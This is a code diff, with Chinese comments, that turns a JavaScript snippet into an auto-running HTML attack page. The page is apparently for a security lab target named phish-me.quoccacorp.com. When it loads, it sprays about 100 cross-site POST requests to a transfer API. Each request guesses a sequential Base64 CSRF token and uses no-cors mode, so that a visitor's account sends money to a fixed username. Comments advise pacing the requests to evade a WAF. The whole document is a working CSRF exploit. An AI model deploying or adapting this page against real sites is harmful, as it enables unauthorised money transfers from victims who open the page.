@@ -1,32 +1,62 @@
-const ME = "z5602760"; 
-const START = 8576; // 记得根据实时观察调整
-const COUNT = 100;  // 别一次发太多，容易被 WAF 封或者浏览器卡死
-const AMOUNT = 1;
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>Transferring...</title>
+</head>
+<body>
+    <div id="status">正在初始化攻击负载...</div>
+    <ul id="log"></ul>
 
-async function doPhish() {
-    for (let i = 0; i < COUNT; i++) {
-        const tokenInt = START + i;
-        const token = btoa(tokenInt.toString()); // 如果后端需要 Base64
+    <script>
+        const ME = "z5602760"; 
+        // ！！！重要：这里填入你观察到的最新 Token 数字 + 10 左右的缓冲
+        const START = 8585; 
+        const COUNT = 100;  
+        const AMOUNT = 1;
+        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
 
-        // 构造表单数据
-        const params = new URLSearchParams();
-        params.append('csrf_token', token);
-        params.append('username', ME);
-        params.append('amount', AMOUNT);
+        async function doPhish() {
+            const statusDiv = document.getElementById('status');
+            const logList = document.getElementById('log');
+            
+            statusDiv.innerText = `正在对 Token 范围 ${START} - ${START + COUNT} 发起喷洒攻击...`;
 
-        // 使用 fetch 发送请求
-        fetch("https://phish-me.quoccacorp.com/api/transfer", {
-            method: "POST",
-            mode: "no-cors", // 关键：CSRF 不需要读取返回结果，绕过 CORS 限制
-            body: params,
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
+            for (let i = 0; i < COUNT; i++) {
+                const tokenInt = START + i;
+                // btoa 会生成 Base64 编码，对应你看到的 ODU3Nw== 这种格式
+                const token = btoa(tokenInt.toString()); 
+
+                const params = new URLSearchParams();
+                params.append('csrf_token', token);
+                params.append('username', ME);
+                params.append('amount', AMOUNT);
+
+                // 发送 POST 请求
+                fetch(targetUrl, {
+                    method: "POST",
+                    mode: "no-cors", // 必须使用 no-cors 绕过跨域限制发送请求
+                    body: params,
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
+                });
+
+                // 在页面上打个日志，方便你自己调试看有没有跑起来
+                if (i % 10 === 0) {
+                    const li = document.createElement('li');
+                    li.innerText = `已发送至 Token: ${tokenInt} (${token})`;
+                    logList.appendChild(li);
+                }
+
+                // 每次请求间隔 50 毫秒，防止浏览器压力过大丢包
+                await new Promise(r => setTimeout(r, 50)); 
             }
-        });
+            statusDiv.innerText = "攻击负载已全部发出。";
+        }
 
-        // 稍微给一点点间隔，防止并发太高导致浏览器丢弃请求
-        await new Promise(r => setTimeout(r, 50)); 
-    }
-}
-
-doPhish();
+        // 页面加载完自动运行
+        window.onload = doPhish;
+    </script>
+</body>
+</html>
